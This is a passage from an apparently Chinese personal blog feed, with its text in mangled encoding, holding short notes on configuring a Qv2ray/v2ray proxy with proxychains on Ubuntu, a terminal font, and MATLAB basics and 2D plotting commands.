    <link href="/2022/10/16/Linux-%E7%BB%88%E7%AB%AF%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/16/Linux-%E7%BB%88%E7%AB%AF%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%90%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://b23.tv/IQEkOWW">å‚è€ƒ</a></p><h1 id="Ubuntu-ä¸‹é…ç½®"><a href="#Ubuntu-ä¸‹é…ç½®" class="headerlink" title="Ubuntu ä¸‹é…ç½®"></a>Ubuntu ä¸‹é…ç½®</h1><p>ä½¿ç”¨ Q2ray, æ˜¯ä¸€ä¸ª Qt5 çš„ç•Œé¢.</p><p><a href="https://github.com/Qv2ray/Qv2ray">Github ç•Œé¢</a>, æœ€æ–°ç‰ˆåœ¨ release ä¸­. ä¸‹è½½ AppImage ç‰ˆæœ¬:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://github.com/Qv2ray/Qv2ray/releases/download/v2.7.0/Qv2ray-v2.7.0-linux-x64.AppImage<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ–‡ä»¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶, éœ€æä¾›å¯æ‰§è¡Œæƒé™:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">chmod</span> u+x file<br></code></pre></td></tr></table></figure><p>å…¶é…ç½®æ–‡ä»¶åœ¨ <code>~/.config/qv2ray</code> ä¸­.</p><p>ä¹‹ååœ¨ <code>~/.config/qv2ray</code> ä¸‹åˆ›å»º <code>vcore</code> æ–‡ä»¶å¤¹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> vcore<br></code></pre></td></tr></table></figure><p>ä¹‹ååœ¨å®˜ç½‘ä¸‹ä¸‹è½½ <code>vcore</code> çš„å†…å®¹:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://github.com/v2fly/v2ray-core/releases/download/v5.1.0/v2ray-linux-64.zip<br></code></pre></td></tr></table></figure><p>å°†å…¶è§£å‹åˆ° <code>~/.config/qv2ray/vcore</code> ä¸‹.</p><p>ä¹‹ååœ¨å›¾å½¢ç•Œé¢ä¸‹é…ç½®, è¿˜éœ€è¦æ·»åŠ èŠ‚ç‚¹.</p><p>å¯åœ¨æµè§ˆå™¨ä¸­è®¿é—® <a href="ipv4.icanhazip.com"><code>ipv4.icanhazip.com</code></a> è¿™ä¸ªç½‘ç«™, ç”¨äºè·å–æœ¬æœºçš„ IPv4 åœ°å€. </p><p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨ <code>curl</code> å‘½ä»¤:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ curl ipv4.icanhazip.com<br></code></pre></td></tr></table></figure><p>å…¶è¿”å›å€¼å°±æ˜¯.</p><p>ä¿®æ”¹ç»ˆç«¯çš„ä»£ç†é…ç½®éœ€è¦å®‰è£… <code>proxychains</code>, å…¶é…ç½®æ–‡ä»¶ä½äº <code>/etc/</code> ä¸‹.</p><p>æ·»åŠ å¦‚:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span> <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">8889</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œè®¾ç½®æ—¶, <code>qv2ray</code> è®¾ç½®çš„ç«¯å£å’Œç³»ç»Ÿè®¾ç½®çš„ç«¯å£éœ€è¦ä¸€ç›´.</p><p>å¯ä»¥æµ‹è¯•:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">proxychai<span class="hljs-symbol">ns4</span> curl www.google.com<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>ping</code> å‘½ä»¤æ˜¯æ— æ³•å‘å¤–ç½‘æœåŠ¡å™¨å‘é€æ•°æ®åŒ…, ä½¿ç”¨ <code>curl</code> æœ‰è¿”å›å€¼.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>st-ä½¿ç”¨çš„å­—ä½“</title>
    <link href="/2022/10/16/st-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AD%97%E4%BD%93/"/>
    <url>/2022/10/16/st-%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AD%97%E4%BD%93/</url>
    
    <content type="html"><![CDATA[<p>ä¸çŸ¥é“å‡ºå¤„äº†è¿™å¼ :<br><img src="/../img/st_%E5%AD%97%E4%BD%93.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-å¢åŠ å°åˆ»åº¦</title>
    <link href="/2022/10/15/Matlab-%E5%A2%9E%E5%8A%A0%E5%B0%8F%E5%88%BB%E5%BA%A6/"/>
    <url>/2022/10/15/Matlab-%E5%A2%9E%E5%8A%A0%E5%B0%8F%E5%88%BB%E5%BA%A6/</url>
    
    <content type="html"><![CDATA[<p>ä½¿ç”¨ <code>xticks</code> å’Œ <code>yticks</code>.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>å‘-matlab-å›¾ä¸­æ·»åŠ æ–‡æœ¬</title>
    <link href="/2022/10/15/%E5%90%91-matlab-%E5%9B%BE%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%96%87%E6%9C%AC/"/>
    <url>/2022/10/15/%E5%90%91-matlab-%E5%9B%BE%E4%B8%AD%E6%B7%BB%E5%8A%A0%E6%96%87%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<p><a href="https://ww2.mathworks.cn/help/matlab/creating_plots/add-text-to-specific-points-on-graph.html">å‚è€ƒ</a><br>ä½¿ç”¨ <code>text</code> å‘½ä»¤.</p>]]></content>
    
    
    <categories>
      
      <category>Matlab</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Matlab-æ­ç§˜-Notes</title>
    <link href="/2022/10/15/Matlab-%E6%8F%AD%E7%A7%98-Notes/"/>
    <url>/2022/10/15/Matlab-%E6%8F%AD%E7%A7%98-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -MATLAB-ç¯å¢ƒ"><a href="#ç¬¬ä¸€ç« -MATLAB-ç¯å¢ƒ" class="headerlink" title="ç¬¬ä¸€ç«  MATLAB ç¯å¢ƒ"></a>ç¬¬ä¸€ç«  MATLAB ç¯å¢ƒ</h1><p>åŸºæœ¬è¿ç®—ç¬¦å·, åŒ…æ‹¬: <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>.</p><p>å¹‚ <code>^</code>.</p><p>èµ‹å€¼ <code>=</code>.</p><p>å¤šä¸ªè¡¨è¾¾å¼å¸è½½åŒä¸€è¡Œ, ç”¨ <code>;</code> åˆ†éš”è¡¨è¾¾å¼.</p><p>ç”¨ <code>who</code> æ˜¾ç¤ºå˜é‡. <code>whos</code> å¾—åˆ°æ›´å¤šä¿¡æ¯.</p><p><code>clear</code> æ¸…é™¤å˜é‡.</p><p>è¡Œå°¾åŠ  <code>...</code> å¯ä»¥ç»­è¡Œ.</p><p>MATLAB é»˜è®¤ç²¾åº¦ä¸º short, è¾“å‡ºå°æ•°ç‚¹å 4 ä½. å¯ç”¨ <code>format</code> å‘½ä»¤ä¿®æ”¹:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">long</span><br></code></pre></td></tr></table></figure><p><code>long</code> ä¸ºåå…­ä½.</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">format</span> bank<br></code></pre></td></tr></table></figure><p>ä¸¤ä½.</p><p>ç§‘å­¦è®¡æ•°æ³•:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">format</span> <span class="hljs-keyword">short</span> e<br></code></pre></td></tr></table></figure><p>è¿”å›æœ€æ¥è¿‘çš„æ¯”ä¾‹å¼:</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">format</span> rat<br></code></pre></td></tr></table></figure><h2 id="åŸºæœ¬æ•°å­¦å®šä¹‰å¼"><a href="#åŸºæœ¬æ•°å­¦å®šä¹‰å¼" class="headerlink" title="åŸºæœ¬æ•°å­¦å®šä¹‰å¼"></a>åŸºæœ¬æ•°å­¦å®šä¹‰å¼</h2><p>ä½¿ç”¨ $\pi$, åªéœ€è¦è¾“å…¥ <code>pi</code>.</p><p>è‡ªç„¶å¸¸æ•° $e$, è¾“å…¥ <code>exp(1)</code>.</p><p>å¾—åˆ°å¹³æ–¹æ ¹: <code>sqrt()</code>.</p><p>è‡ªç„¶å¯¹æ•°:  <code>log()</code>, ä»¥ 10 ä¸ºåº•: <code>log10()</code>.</p><p>ä¸‰è§’å‡½æ•°å’Œåä¸‰è§’å‡½æ•°: <code>cos()</code>, <code>acos()</code>.</p><p>å¤æ•°å½¢å¼: <code>z=x+yi</code></p><h2 id="æ–‡ä»¶åŸºç¡€"><a href="#æ–‡ä»¶åŸºç¡€" class="headerlink" title="æ–‡ä»¶åŸºç¡€"></a>æ–‡ä»¶åŸºç¡€</h2><p><code>%</code> æ˜¯æ³¨é‡Š.</p><p>æ•°ç»„, å…ƒç´ ç”¨ <code>:</code> æˆ– <code>;</code> åˆ†å¼€: <code>x = [1:2:3:4] ; y = exp(x)</code>, è¾“å‡ºä¸ºå››ä¸ª.</p><h2 id="ç»“æŸ"><a href="#ç»“æŸ" class="headerlink" title="ç»“æŸ"></a>ç»“æŸ</h2><p>è¾“å…¥ <code>quit</code>.</p><h1 id="ç¬¬äºŒç« -å‘é‡ä¸çŸ©é˜µ"><a href="#ç¬¬äºŒç« -å‘é‡ä¸çŸ©é˜µ" class="headerlink" title="ç¬¬äºŒç«  å‘é‡ä¸çŸ©é˜µ"></a>ç¬¬äºŒç«  å‘é‡ä¸çŸ©é˜µ</h1><h1 id="ç¬¬ä¸‰ç« -ç»˜å›¾ä¸å›¾å½¢"><a href="#ç¬¬ä¸‰ç« -ç»˜å›¾ä¸å›¾å½¢" class="headerlink" title="ç¬¬ä¸‰ç«  ç»˜å›¾ä¸å›¾å½¢"></a>ç¬¬ä¸‰ç«  ç»˜å›¾ä¸å›¾å½¢</h1><h2 id="2D-ç»˜å›¾åŸºç¡€"><a href="#2D-ç»˜å›¾åŸºç¡€" class="headerlink" title="2D ç»˜å›¾åŸºç¡€"></a>2D ç»˜å›¾åŸºç¡€</h2><p>ä¸‰ä¸ªæ­¥éª¤:<br>    1. å®šä¹‰å‡½æ•°<br>    2. æŒ‡å®šè¦ç»˜åˆ¶çš„å‡½æ•°å›¾å½¢çš„å€¼èŒƒå›´<br>    3. è°ƒç”¨ MATLAB çš„ <code>plot(x, y)</code> å‡½æ•°</p><p>æŒ‡å®šå‡½æ•°çš„å€¼çš„èŒƒå›´æ—¶, éœ€è¦æŒ‡å®šå¢é‡. æ ¼å¼:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">[ <span class="hljs-keyword">start</span> : <span class="hljs-type">interval</span> : <span class="hljs-keyword">end</span> ]<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> [ <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span> ]<span class="hljs-comment">;</span><br>y <span class="hljs-operator">=</span> cos(<span class="hljs-keyword">x</span>)<span class="hljs-comment">;</span><br>plot(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span> y)<br></code></pre></td></tr></table></figure><p>æ¯è¡Œç”¨ <code>;</code> ç»“å°¾å¯ä»¥æŠ‘åˆ¶ MATLAB çš„è¾“å‡º.</p><p>è‹¥è¦é‡æ–°ç”»å›¾, éœ€è¦é‡æ–°è¾“å…¥æ‰€æœ‰å‘½ä»¤.</p><h3 id="æ·»åŠ åæ ‡è½´æ ‡ç­¾"><a href="#æ·»åŠ åæ ‡è½´æ ‡ç­¾" class="headerlink" title="æ·»åŠ åæ ‡è½´æ ‡ç­¾"></a>æ·»åŠ åæ ‡è½´æ ‡ç­¾</h3><p>æ·»åŠ åæ ‡è½´æ ‡ç­¾, ä½¿ç”¨ <code>xlabel</code> å’Œ <code>ylabel</code>:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss">x = [ <span class="hljs-number">0</span>:<span class="hljs-number">0.1</span>:<span class="hljs-number">10</span> ];<br>y = <span class="hljs-built_in">cos</span>(x);<br><span class="hljs-keyword">plot</span>(x, y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">cos</span>(x)&#x27;);<br></code></pre></td></tr></table></figure><h2 id="æ›´å¤š-2D-ç»˜å›¾é€‰é¡¹"><a href="#æ›´å¤š-2D-ç»˜å›¾é€‰é¡¹" class="headerlink" title="æ›´å¤š 2D ç»˜å›¾é€‰é¡¹"></a>æ›´å¤š 2D ç»˜å›¾é€‰é¡¹</h2><h3 id="åœ¨å›¾åƒæ­£ä¸Šæ–¹æ‰“å°æ ‡é¢˜"><a href="#åœ¨å›¾åƒæ­£ä¸Šæ–¹æ‰“å°æ ‡é¢˜" class="headerlink" title="åœ¨å›¾åƒæ­£ä¸Šæ–¹æ‰“å°æ ‡é¢˜"></a>åœ¨å›¾åƒæ­£ä¸Šæ–¹æ‰“å°æ ‡é¢˜</h3><p>åœ¨å›¾åƒæ­£ä¸Šæ–¹æ‰“å°æ ‡é¢˜, ä½¿ç”¨ <code>title</code> å‘½ä»¤.</p><p>ä½¿ç”¨ <code>fplot</code> å¯ä»¥é¿å…å¦‚ä¸‹æŠ¥é”™:</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">??? <span class="hljs-built_in">Error</span> using =<span class="hljs-function">=&gt;</span> mtimes<br>Inner matrix dimensions must agree.<br></code></pre></td></tr></table></figure><p><code>fplot</code> æ ¼å¼: <code>fplot(&#39;function string&#39;, [xstart, xend])</code></p><p>ä¾‹:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">fplot</span><span class="hljs-params">(<span class="hljs-string">&#x27;exp(-2*t).*sin(t)&#x27;</span>, [<span class="hljs-number">0</span>, <span class="hljs-number">4</span>])</span></span>, <span class="hljs-built_in">xlabel</span>(<span class="hljs-string">&#x27;t&#x27;</span>), <span class="hljs-built_in">ylabel</span>(<span class="hljs-string">&#x27;f(t)&#x27;</span>), <span class="hljs-built_in">title</span>(<span class="hljs-string">&#x27;Name&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ³¨æ„, å½“ä¸€ä¸ªå‡½æ•°æ˜¯ç”±ä¸¤ä¸ªæˆ–æ›´å¤šå‡½æ•°ç›¸ä¹˜æ„æˆ, éœ€è¦åœ¨ç›¸ä¹˜æ—¶åŠ ä¸Š â€œ.â€ æ¥å‘Šè¯‰ MATLAB æ˜¯å¯¹ä¸¤ä¸ªçŸ©é˜µç›¸ä¹˜. å³ <code>.*</code> è¡¨ç¤ºçŸ©é˜µç›¸ä¹˜.</p><h3 id="ç»™å›¾åƒæ·»åŠ ç½‘æ ¼"><a href="#ç»™å›¾åƒæ·»åŠ ç½‘æ ¼" class="headerlink" title="ç»™å›¾åƒæ·»åŠ ç½‘æ ¼"></a>ç»™å›¾åƒæ·»åŠ ç½‘æ ¼</h3><p>ä½¿ç”¨ <code>grid on</code>:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y)</span></span>, <span class="hljs-attribute">grid</span> on<br></code></pre></td></tr></table></figure><h3 id="è°ƒæ•´åæ ‡è½´"><a href="#è°ƒæ•´åæ ‡è½´" class="headerlink" title="è°ƒæ•´åæ ‡è½´"></a>è°ƒæ•´åæ ‡è½´</h3><p><code>axis square</code> äº§ç”Ÿæ­£æ–¹å½¢å›¾åƒ.</p><p><code>axis equal</code> äº§ç”Ÿä¸€ä¸ªä¸¤åæ ‡è½´æ¯”ä¾‹å’Œé—´è·éƒ½ç›¸åŒçš„å›¾åƒ.</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y)</span></span>, <span class="hljs-attribute">grid</span> on, axis equal<br></code></pre></td></tr></table></figure><h2 id="åœ¨åŒä¸€å›¾åƒä¸­æ˜¾ç¤ºå¤šä¸ªå‡½æ•°"><a href="#åœ¨åŒä¸€å›¾åƒä¸­æ˜¾ç¤ºå¤šä¸ªå‡½æ•°" class="headerlink" title="åœ¨åŒä¸€å›¾åƒä¸­æ˜¾ç¤ºå¤šä¸ªå‡½æ•°"></a>åœ¨åŒä¸€å›¾åƒä¸­æ˜¾ç¤ºå¤šä¸ªå‡½æ•°</h2><p>åŒæ ·è°ƒç”¨ <code>plot(x,y)</code> å‡½æ•°, ä¸¤ä¸¤æˆå¯¹, åä¸€ä¸ªå‚æ•°å¯è¡¨ç¤ºæ›²çº¿é£æ ¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(t,f,t,g,<span class="hljs-string">&#x27;--&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>é£æ ¼åŒ…æ‹¬:</p><ul><li>å®çº¿ <code>-</code></li><li>è™šçº¿ <code>--</code></li><li>è™šç‚¹çº¿ <code>-.</code></li><li>ç‚¹çº¿ <code>.</code></li></ul><h2 id="æ·»åŠ å›¾ä¾‹"><a href="#æ·»åŠ å›¾ä¾‹" class="headerlink" title="æ·»åŠ å›¾ä¾‹"></a>æ·»åŠ å›¾ä¾‹</h2><p>å›¾ä¾‹, å³å‘Šè¯‰è¯»è€…è¿™ä¸ªæ›²çº¿æ˜¯ä»€ä¹ˆ.</p><p>ä½¿ç”¨ <code>legend</code> å‘½ä»¤å¹¶è·Ÿåœ¨ <code>plot(x,y)</code> ä¹‹å:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">legend(&#x27;sinh(<span class="hljs-name">x</span>)&#x27;,&#x27;cosh(<span class="hljs-name">x</span>)&#x27;)<br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,x,z,<span class="hljs-string">&#x27;-.&#x27;</span>)</span></span>, <span class="hljs-built_in">xlabel</span>(<span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-built_in">ylabel</span>(<span class="hljs-string">&#x27;Potential&#x27;</span>), <span class="hljs-selector-tag">legend</span>(<span class="hljs-string">&#x27;sinh(x)&#x27;</span>,<span class="hljs-string">&#x27;cosh(x)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¯ç”¨é¼ æ ‡æ‹–åŠ¨å›¾ä¾‹.<br><img src="/../img/show_what_fn_mean.png"></p><h3 id="ä¿®æ”¹æ›²çº¿é¢œè‰²"><a href="#ä¿®æ”¹æ›²çº¿é¢œè‰²" class="headerlink" title="ä¿®æ”¹æ›²çº¿é¢œè‰²"></a>ä¿®æ”¹æ›²çº¿é¢œè‰²</h3><p>çº¢è‰²ä¸º <code>r</code> (red), è“è‰²ä¸º <code>b</code> (blue):</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,<span class="hljs-string">&#x27;r&#x27;</span>,x,z,<span class="hljs-string">&#x27;b&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>æˆ–:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">plot</span><span class="hljs-params">(x,y,<span class="hljs-string">&#x27;r&#x27;</span>,x,z,<span class="hljs-string">&#x27;b--&#x27;</span>)</span></span><br></code></pre></td></tr></table></figure><p>æœ‰å…«ç§é¢œè‰²:<br><img src="/../img/eight_colors_of_matlab.png"></p><h2 id="è®¾ç½®åæ ‡æ¯”ä¾‹"><a href="#è®¾ç½®åæ ‡æ¯”ä¾‹" class="headerlink" title="è®¾ç½®åæ ‡æ¯”ä¾‹"></a>è®¾ç½®åæ ‡æ¯”ä¾‹</h2><p>è°ƒç”¨ <code>axis</code> å‘½ä»¤. æ ¼å¼ä¸º:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">axis</span><span class="hljs-params">( [xmin xmax ymin ymax] )</span></span><br></code></pre></td></tr></table></figure><p>å¦‚:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-keyword">x</span> <span class="hljs-operator">=</span> [<span class="hljs-number">0</span>:<span class="hljs-number">0.01</span>:<span class="hljs-number">5</span>]<span class="hljs-comment">;</span><br>y <span class="hljs-operator">=</span> sin(<span class="hljs-number">2</span>*<span class="hljs-keyword">x</span> + <span class="hljs-number">3</span>)<span class="hljs-comment">;</span><br>plot(<span class="hljs-keyword">x</span><span class="hljs-punctuation">,</span>y)<span class="hljs-punctuation">,</span> axis([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h3 id="å°†å‡½æ•°å¹³æ–¹"><a href="#å°†å‡½æ•°å¹³æ–¹" class="headerlink" title="å°†å‡½æ•°å¹³æ–¹"></a>å°†å‡½æ•°å¹³æ–¹</h3><p>ä½¿ç”¨ <code>.^</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">y</span> = sin(<span class="hljs-number">5</span>*x).^<span class="hljs-number">2</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="å­å›¾"><a href="#å­å›¾" class="headerlink" title="å­å›¾"></a>å­å›¾</h2><p>å³ä¸€ä¸ªå›¾ä¸Šæ˜¾ç¤ºå¤šäºä¸€ä¸ªå›¾åƒ.</p><p>ä½¿ç”¨ <code>subplot(m,n,p)</code> å‘½ä»¤. <code>m</code> å’Œ <code>n</code> å‘Šè¯‰ MATLAB äº§ç”Ÿçš„å­å›¾æœ‰ <code>m</code> è¡Œå’Œ <code>n</code> åˆ— (æŒ‡çª—æ ¼å—). <code>p</code> ç”¨æ¥å‘Šè¯‰ MATLAB æˆ‘ä»¬æ‰€è¦è´´ä¸Šå»çš„æŸä¸ªå·²ç»ç»˜åˆ¶çš„å›¾å½¢çª—å£ (ä¹Ÿå°±æ˜¯è¯´ä¸‹ä¸€ä¸ªç»˜åˆ¶çš„å›¾åƒæ˜¯æ”¾åœ¨ç¬¬å‡ åˆ—).</p><p>å¦‚:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gauss">x = [<span class="hljs-number">0</span>:<span class="hljs-number">0.01</span>:<span class="hljs-number">5</span>];<br>y = <span class="hljs-built_in">exp</span>(<span class="hljs-number">-1.2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x);<br><span class="hljs-built_in">subplot</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>);<br><span class="hljs-keyword">plot</span>(x,y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">exp</span>(<span class="hljs-number">-1.2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x)&#x27;), <span class="hljs-built_in">axis</span>([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br><br>y = <span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x);<br><span class="hljs-built_in">subplot</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">2</span>)<br><span class="hljs-keyword">plot</span>(x,y), <span class="hljs-built_in">xlabel</span>(&#x27;x&#x27;), <span class="hljs-built_in">ylabel</span>(&#x27;<span class="hljs-built_in">exp</span>(<span class="hljs-number">-2</span>*x).*<span class="hljs-built_in">sin</span>(<span class="hljs-number">20</span>*x)&#x27;), <span class="hljs-built_in">axis</span>([<span class="hljs-number">0</span> <span class="hljs-number">5</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br><br></code></pre></td></tr></table></figure><p>ç»“æœ:<br><img src="/../img/subplot_two_graph.png"></p><h2 id="å›¾åƒé‡å å’Œ-linspace-å‘½ä»¤"><a href="#å›¾åƒé‡å å’Œ-linspace-å‘½ä»¤" class="headerlink" title="å›¾åƒé‡å å’Œ linspace å‘½ä»¤"></a>å›¾åƒé‡å å’Œ linspace å‘½ä»¤</h2><p>å…ˆç»˜åˆ¶äº†ä¸€ä¸ªå›¾åƒ, åˆå†³å®šåœ¨åŒä¸€ä¸ªå›¾å½¢ä¸Šå†ç»˜åˆ¶å¦ä¸€ä¸ªå‡½æ•°çš„å›¾åƒ.</p><p>ç”¨ <code>linspace</code> å‘½ä»¤äº§ç”Ÿæ•°é›†, æ ¼å¼:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-selector-tag">a</span>,<span class="hljs-selector-tag">b</span>,n)<br></code></pre></td></tr></table></figure><p>è¡¨ç¤ºåœ¨ a åˆ° b ä¹‹é—´å– n ä¸ªç‚¹. æ²¡æœ‰ n æ—¶å‡åŒ€å–å‡º 100 ä¸ª.</p><p>å¦‚:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs matlab">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>);<br><span class="hljs-built_in">plot</span>(x,<span class="hljs-built_in">cos</span>(x))<br></code></pre></td></tr></table></figure><p>åŒæ—¶ç»˜åˆ¶ä¸¤ä¸ªå›¾åƒ, ä½¿ç”¨ <code>hold on</code>:</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab">x = <span class="hljs-built_in">linspace</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span>);<br><span class="hljs-built_in">plot</span>(x,<span class="hljs-built_in">cos</span>(x))<br><span class="hljs-built_in">hold</span> on <br><span class="hljs-built_in">plot</span>(x, <span class="hljs-built_in">sin</span>(x)), axis([<span class="hljs-number">0</span> <span class="hljs-number">2</span>*<span class="hljs-built_in">pi</span> <span class="hljs-number">-1</span> <span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h2 id="æåæ ‡å’Œå¯¹æ•°å›¾åƒ"><a href="#æåæ ‡å’Œå¯¹æ•°å›¾åƒ" class="headerlink" title="æåæ ‡å’Œå¯¹æ•°å›¾åƒ"></a>æåæ ‡å’Œå¯¹æ•°å›¾åƒ</h2><h2 id="ç¦»æ•£æ•°æ®ç»˜å›¾"><a href="#ç¦»æ•£æ•°æ®ç»˜å›¾" class="headerlink" 